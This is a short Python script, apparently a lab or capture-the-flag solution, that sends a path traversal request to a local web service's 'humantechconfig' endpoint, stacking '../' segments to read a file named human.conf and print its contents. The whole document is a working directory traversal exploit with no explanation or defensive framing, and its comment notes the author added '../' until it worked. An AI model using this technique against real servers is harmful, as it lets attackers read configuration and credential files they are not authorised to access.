#Added ‘../’ to the url till it worked
  
import urllib.parse
import urllib.request

url = "http://127.0.0.1:8082/humantechconfig?file=../../../../../../../../../../human.conf"
req = urllib.request.Request(url)
response = urllib.request.urlopen(req)
print(response.read())

